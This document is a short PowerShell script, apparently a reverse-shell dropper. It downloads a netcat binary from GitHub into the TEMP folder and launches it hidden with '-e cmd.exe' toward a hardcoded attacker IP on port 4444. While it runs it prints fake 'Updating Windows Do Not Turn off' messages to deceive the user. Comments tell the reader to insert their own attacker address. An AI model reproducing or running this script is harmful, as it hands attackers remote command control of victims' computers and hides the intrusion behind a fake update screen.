# Set variables for the listener IP and port
$listenerIP = '65.52.209.243'  # Replace with your attacker's IP address
$port = 4444  # Replace with the port you're listening on

# Set the URL to download Netcat (nc.exe) for Windows
$ncUrl = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe'

# Set the destination path to store Netcat in the TEMP directory
$ncPath = "$env:TEMP\nc.exe"  # Use double quotes for variable expansion

# Check if Netcat is already downloaded, if not, download it
If (-Not (Test-Path $ncPath)) {
    Write-Host 'Updating Windows Do Not Turn off...'
    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
    Write-Host "Updating Windows Do Not Turn off..."
} else {
    Write-Host "Updating Windows Do Not Turn off..."
}

Write-Host "Updating Windows Do Not Turn off..."

Start-Process $ncPath -ArgumentList "${listenerIP} ${port} -e cmd.exe" -WindowStyle Hidden

 
